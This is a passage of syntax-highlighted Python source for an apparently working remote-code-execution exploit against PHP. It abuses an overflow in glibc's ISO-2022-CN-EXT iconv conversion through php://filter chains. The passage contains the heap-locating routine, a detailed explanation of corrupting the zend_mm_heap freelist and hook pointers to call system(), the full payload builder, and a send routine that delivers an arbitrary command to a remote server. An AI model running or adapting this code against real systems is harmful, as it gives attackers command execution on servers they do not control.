        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_file</span><span class="p">(</span><span class="n">remote_path</span><span class="p">)</span>
        <span class="n">Path</span><span class="p">(</span><span class="n">local_path</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">find_main_heap</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">regions</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="n">Region</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="n">Region</span><span class="p">:</span>
        <span class="c1"># Any anonymous RW region with a size superior to the base heap size is a</span>
        <span class="c1"># candidate. The heap is at the bottom of the region.</span>
        <span class="n">heaps</span> <span class="o">=</span> <span class="p">[</span>
            <span class="n">region</span><span class="o">.</span><span class="n">stop</span> <span class="o">-</span> <span class="n">HEAP_SIZE</span> <span class="o">+</span> <span class="mh">0x40</span>
            <span class="k">for</span> <span class="n">region</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">regions</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">region</span><span class="o">.</span><span class="n">permissions</span> <span class="o">==</span> <span class="s2">&quot;rw-p&quot;</span>
            <span class="ow">and</span> <span class="n">region</span><span class="o">.</span><span class="n">size</span> <span class="o">&gt;=</span> <span class="n">HEAP_SIZE</span>
            <span class="ow">and</span> <span class="n">region</span><span class="o">.</span><span class="n">stop</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">HEAP_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
            <span class="ow">and</span> <span class="n">region</span><span class="o">.</span><span class="n">path</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span>
        <span class="p">]</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">heaps</span><span class="p">:</span>
            <span class="n">failure</span><span class="p">(</span><span class="s2">&quot;Unable to find PHP&#39;s main heap in memory&quot;</span><span class="p">)</span>

        <span class="n">first</span> <span class="o">=</span> <span class="n">heaps</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">heaps</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">heaps</span> <span class="o">=</span> <span class="s2">&quot;, &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="n">heaps</span><span class="p">))</span>
            <span class="n">msg_info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Potential heaps: [i]</span><span class="si">{</span><span class="n">heaps</span><span class="si">}</span><span class="s2">[/] (using first)&quot;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">msg_info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Using [i]</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">first</span><span class="p">)</span><span class="si">}</span><span class="s2">[/] as heap&quot;</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">first</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">check_vulnerable</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">get_symbols_and_addresses</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">exploit</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">build_exploit_path</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>

<span class="sd">        On each step of the exploit, a filter will process each chunk one after the</span>
<span class="sd">        other. Processing generally involves making some kind of operation either</span>
<span class="sd">        on the chunk or in a destination chunk of the same size. Each operation is</span>
<span class="sd">        applied on every single chunk; you cannot make PHP apply iconv on the first 10</span>
<span class="sd">        chunks and leave the rest in place. That&#39;s where the difficulties come from.</span>

<span class="sd">        Keep in mind that we know the address of the main heap, and the libraries.</span>
<span class="sd">        ASLR/PIE do not matter here.</span>

<span class="sd">        The idea is to use the bug to make the freelist for chunks of size 0x100 point</span>
<span class="sd">        lower. For instance, we have the following free list:</span>

<span class="sd">        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00</span>

<span class="sd">        By triggering the bug from chunk ..900, we get:</span>

<span class="sd">        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???</span>

<span class="sd">        That&#39;s step 3.</span>

<span class="sd">        Now, in order to control the free list, and make it point whereever we want,</span>
<span class="sd">        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,</span>
<span class="sd">        we&#39;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.</span>
<span class="sd">        That&#39;s step 2.</span>

<span class="sd">        Now, if we were to perform step2 an then step3 without anything else, we&#39;d have</span>
<span class="sd">        a problem: after step2 has been processed, the free list goes bottom-up, like:</span>

<span class="sd">        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900</span>

<span class="sd">        We need to go the other way around. That&#39;s why we have step 1: it just allocates</span>
<span class="sd">        chunks. When they get freed, they reverse the free list. Now step2 allocates in</span>
<span class="sd">        reverse order, and therefore after step2, chunks are in the correct order.</span>

<span class="sd">        Another problem comes up.</span>

<span class="sd">        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.</span>
<span class="sd">        Since step2 creates chunks that contain pointers and pointers are generally not</span>
<span class="sd">        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.</span>
<span class="sd">        To avoid this, we put the chunks in step2 at the very end of the chain, and</span>
<span class="sd">        prefix them with `0\n`. When dechunked (right before the iconv), they will</span>
<span class="sd">        &quot;disappear&quot; from the chain, preserving them from the character set conversion</span>
<span class="sd">        and saving us from an unwanted processing error that would stop the processing</span>
<span class="sd">        chain.</span>

<span class="sd">        After step3 we have a corrupted freelist with an arbitrary pointer into it. We</span>
<span class="sd">        don&#39;t know the precise layout of the heap, but we know that at the top of the</span>
<span class="sd">        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.</span>
<span class="sd">        Its free_slot[] array contains a pointer to each free list. By overwriting it,</span>
<span class="sd">        we can make PHP allocate chunks whereever we want. In addition, its custom_heap</span>
<span class="sd">        field contains pointers to hook functions for emalloc, efree, and erealloc</span>
<span class="sd">        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and</span>
<span class="sd">        then overwrite the use_custom_heap flag to make PHP use these function pointers</span>
<span class="sd">        instead. We can now do our favorite CTF technique and get a call to</span>
<span class="sd">        system(&lt;chunk&gt;).</span>
<span class="sd">        We make sure that the &quot;system&quot; command kills the current process to avoid other</span>
<span class="sd">        system() calls with random chunk data, leading to undefined behaviour.</span>

<span class="sd">        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the</span>
<span class="sd">        process is in a random state, we still get contiguous, in order chunks for our</span>
<span class="sd">        exploit.</span>

<span class="sd">        Therefore, the whole process described here CANNOT crash. Everything falls</span>
<span class="sd">        perfectly in place, and nothing can get in the middle of our allocations.</span>
<span class="sd">        &quot;&quot;&quot;</span>

        <span class="n">LIBC</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">info</span><span class="p">[</span><span class="s2">&quot;libc&quot;</span><span class="p">]</span>
        <span class="n">ADDR_EMALLOC</span> <span class="o">=</span> <span class="n">LIBC</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;__libc_malloc&quot;</span><span class="p">]</span>
        <span class="n">ADDR_EFREE</span> <span class="o">=</span> <span class="n">LIBC</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;__libc_system&quot;</span><span class="p">]</span>
        <span class="n">ADDR_EREALLOC</span> <span class="o">=</span> <span class="n">LIBC</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;__libc_realloc&quot;</span><span class="p">]</span>

        <span class="n">ADDR_HEAP</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">info</span><span class="p">[</span><span class="s2">&quot;heap&quot;</span><span class="p">]</span>
        <span class="n">ADDR_FREE_SLOT</span> <span class="o">=</span> <span class="n">ADDR_HEAP</span> <span class="o">+</span> <span class="mh">0x20</span>
        <span class="n">ADDR_CUSTOM_HEAP</span> <span class="o">=</span> <span class="n">ADDR_HEAP</span> <span class="o">+</span> <span class="mh">0x0168</span>

        <span class="n">ADDR_FAKE_BIN</span> <span class="o">=</span> <span class="n">ADDR_FREE_SLOT</span> <span class="o">-</span> <span class="mh">0x10</span>

        <span class="n">CS</span> <span class="o">=</span> <span class="mh">0x100</span>

        <span class="c1"># Pad needs to stay at size 0x100 at every step</span>
        <span class="n">pad_size</span> <span class="o">=</span> <span class="n">CS</span> <span class="o">-</span> <span class="mh">0x18</span>
        <span class="n">pad</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="n">pad_size</span>
        <span class="n">pad</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">pad</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
        <span class="n">pad</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">pad</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
        <span class="n">pad</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">pad</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
        <span class="n">pad</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">pad</span><span class="p">)</span>

        <span class="n">step1_size</span> <span class="o">=</span> <span class="mi">1</span>
        <span class="n">step1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="n">step1_size</span>
        <span class="n">step1</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step1</span><span class="p">)</span>
        <span class="n">step1</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step1</span><span class="p">)</span>
        <span class="n">step1</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step1</span><span class="p">,</span> <span class="n">CS</span><span class="p">)</span>
        <span class="n">step1</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step1</span><span class="p">)</span>

        <span class="c1"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span>
        <span class="c1"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span>

        <span class="n">step2_size</span> <span class="o">=</span> <span class="mh">0x48</span>
        <span class="n">step2</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">step2_size</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>
        <span class="n">step2</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step2</span><span class="p">,</span> <span class="n">CS</span><span class="p">)</span>
        <span class="n">step2</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step2</span><span class="p">)</span>
        <span class="n">step2</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step2</span><span class="p">)</span>

        <span class="n">step2_write_ptr</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;0</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">step2_size</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ADDR_FAKE_BIN</span><span class="p">)</span>
        <span class="n">step2_write_ptr</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step2_write_ptr</span><span class="p">,</span> <span class="n">CS</span><span class="p">)</span>
        <span class="n">step2_write_ptr</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step2_write_ptr</span><span class="p">)</span>
        <span class="n">step2_write_ptr</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step2_write_ptr</span><span class="p">)</span>

        <span class="n">step3_size</span> <span class="o">=</span> <span class="n">CS</span>

        <span class="n">step3</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="n">step3_size</span>
        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span> <span class="o">==</span> <span class="n">CS</span>
        <span class="n">step3</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span>
        <span class="n">step3</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span>
        <span class="n">step3</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span>
        <span class="n">step3</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step3</span><span class="p">)</span>

        <span class="n">step3_overflow</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">step3_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">BUG</span><span class="p">))</span> <span class="o">+</span> <span class="n">BUG</span>
        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span> <span class="o">==</span> <span class="n">CS</span>
        <span class="n">step3_overflow</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span>
        <span class="n">step3_overflow</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span>
        <span class="n">step3_overflow</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span>
        <span class="n">step3_overflow</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step3_overflow</span><span class="p">)</span>

        <span class="n">step4_size</span> <span class="o">=</span> <span class="n">CS</span>
        <span class="n">step4</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;=00&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">step4_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">step4</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4</span><span class="p">)</span>
        <span class="n">step4</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4</span><span class="p">)</span>
        <span class="n">step4</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4</span><span class="p">)</span>
        <span class="n">step4</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step4</span><span class="p">)</span>

        <span class="c1"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span>
        <span class="c1"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span>
        <span class="n">step4_pwn</span> <span class="o">=</span> <span class="n">ptr_bucket</span><span class="p">(</span>
            <span class="mh">0x200000</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="c1"># free_slot</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="n">ADDR_CUSTOM_HEAP</span><span class="p">,</span>  <span class="c1"># 0x18</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="n">ADDR_HEAP</span><span class="p">,</span>  <span class="c1"># 0x140</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="mi">0</span><span class="p">,</span>
            <span class="n">size</span><span class="o">=</span><span class="n">CS</span><span class="p">,</span>
        <span class="p">)</span>

        <span class="n">step4_custom_heap</span> <span class="o">=</span> <span class="n">ptr_bucket</span><span class="p">(</span>
            <span class="n">ADDR_EMALLOC</span><span class="p">,</span> <span class="n">ADDR_EFREE</span><span class="p">,</span> <span class="n">ADDR_EREALLOC</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x18</span>
        <span class="p">)</span>

        <span class="n">step4_use_custom_heap_size</span> <span class="o">=</span> <span class="mh">0x140</span>

        <span class="n">COMMAND</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">command</span>
        <span class="n">COMMAND</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;kill -9 $PPID; </span><span class="si">{</span><span class="n">COMMAND</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">sleep</span><span class="p">:</span>
            <span class="n">COMMAND</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;sleep </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">sleep</span><span class="si">}</span><span class="s2">; </span><span class="si">{</span><span class="n">COMMAND</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="n">COMMAND</span> <span class="o">=</span> <span class="n">COMMAND</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>

        <span class="k">assert</span> <span class="p">(</span>
            <span class="nb">len</span><span class="p">(</span><span class="n">COMMAND</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">step4_use_custom_heap_size</span>
        <span class="p">),</span> <span class="sa">f</span><span class="s2">&quot;Command too big (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">COMMAND</span><span class="p">)</span><span class="si">}</span><span class="s2">), it must be strictly inferior to </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">step4_use_custom_heap_size</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="n">COMMAND</span> <span class="o">=</span> <span class="n">COMMAND</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">step4_use_custom_heap_size</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">COMMAND</span>
        <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">qpe</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
        <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
        <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
        <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>
        <span class="n">step4_use_custom_heap</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">step4_use_custom_heap</span><span class="p">)</span>

        <span class="n">pages</span> <span class="o">=</span> <span class="p">(</span>
            <span class="n">step4</span> <span class="o">*</span> <span class="mi">3</span>
            <span class="o">+</span> <span class="n">step4_pwn</span>
            <span class="o">+</span> <span class="n">step4_custom_heap</span>
            <span class="o">+</span> <span class="n">step4_use_custom_heap</span>
            <span class="o">+</span> <span class="n">step3_overflow</span>
            <span class="o">+</span> <span class="n">pad</span> <span class="o">*</span> <span class="bp">self</span><span class="o">.</span><span class="n">pad</span>
            <span class="o">+</span> <span class="n">step1</span> <span class="o">*</span> <span class="mi">3</span>
            <span class="o">+</span> <span class="n">step2_write_ptr</span>
            <span class="o">+</span> <span class="n">step2</span> <span class="o">*</span> <span class="mi">2</span>
        <span class="p">)</span>

        <span class="n">resource</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="n">compress</span><span class="p">(</span><span class="n">pages</span><span class="p">))</span>
        <span class="n">resource</span> <span class="o">=</span> <span class="n">b64</span><span class="p">(</span><span class="n">resource</span><span class="p">)</span>
        <span class="n">resource</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;data:text/plain;base64,</span><span class="si">{</span><span class="n">resource</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span>

        <span class="n">filters</span> <span class="o">=</span> <span class="p">[</span>
            <span class="c1"># Create buckets</span>
            <span class="s2">&quot;zlib.inflate&quot;</span><span class="p">,</span>
            <span class="s2">&quot;zlib.inflate&quot;</span><span class="p">,</span>

            <span class="c1"># Step 0: Setup heap</span>
            <span class="s2">&quot;dechunk&quot;</span><span class="p">,</span>
            <span class="s2">&quot;convert.iconv.latin1.latin1&quot;</span><span class="p">,</span>

            <span class="c1"># Step 1: Reverse FL order</span>
            <span class="s2">&quot;dechunk&quot;</span><span class="p">,</span>
            <span class="s2">&quot;convert.iconv.latin1.latin1&quot;</span><span class="p">,</span>

            <span class="c1"># Step 2: Put fake pointer and make FL order back to normal</span>
            <span class="s2">&quot;dechunk&quot;</span><span class="p">,</span>
            <span class="s2">&quot;convert.iconv.latin1.latin1&quot;</span><span class="p">,</span>

            <span class="c1"># Step 3: Trigger overflow</span>
            <span class="s2">&quot;dechunk&quot;</span><span class="p">,</span>
            <span class="s2">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span><span class="p">,</span>

            <span class="c1"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span>
            <span class="s2">&quot;convert.quoted-printable-decode&quot;</span><span class="p">,</span>
            <span class="s2">&quot;convert.iconv.latin1.latin1&quot;</span><span class="p">,</span>
        <span class="p">]</span>
        <span class="n">filters</span> <span class="o">=</span> <span class="s2">&quot;|&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">filters</span><span class="p">)</span>
        <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;php://filter/read=</span><span class="si">{</span><span class="n">filters</span><span class="si">}</span><span class="s2">/resource=</span><span class="si">{</span><span class="n">resource</span><span class="si">}</span><span class="s2">&quot;</span>

        <span class="k">return</span> <span class="n">path</span>

    <span class="nd">@inform</span><span class="p">(</span><span class="s2">&quot;Triggering...&quot;</span><span class="p">)</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
        <span class="n">path</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">build_exploit_path</span><span class="p">()</span>
        <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">remote</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
        <span class="k">except</span> <span class="p">(</span><span class="ne">ConnectionError</span><span class="p">,</span> <span class="n">ChunkedEncodingError</span><span class="p">):</span>
            <span class="k">pass</span>

        <span class="n">msg_print</span><span class="p">()</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">sleep</span><span class="p">:</span>
            <span class="n">msg_print</span><span class="p">(</span><span class="s2">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">start</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">sleep</span> <span class="o">&lt;=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">():</span>
            <span class="n">msg_print</span><span class="p">(</span><span class="s2">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="c1"># Wrong heap, maybe? If the exploited suggested others, use them!</span>
            <span class="n">msg_print</span><span class="p">(</span><span class="s2">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span><span class="p">)</span>

        <span class="n">msg_print</span><span class="p">()</span>


<span class="k">def</span><span class="w"> </span><span class="nf">compress</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="c1"># Remove 2-byte header and 4-byte checksum</span>
    <span class="k">return</span> <span class="n">zlib</span><span class="o">.</span><span class="n">compress</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">9</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>


<span class="k">def</span><span class="w"> </span><span class="nf">b64</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">misalign</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">misalign</span> <span class="ow">and</span> <span class="n">payload</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">):</span>
        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Misaligned: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>


<span class="k">def</span><span class="w"> </span><span class="nf">compressed_bucket</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mh">0x8000</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">qpe</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Emulates quoted-printable-encode.</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;=</span><span class="si">{</span><span class="n">x</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>


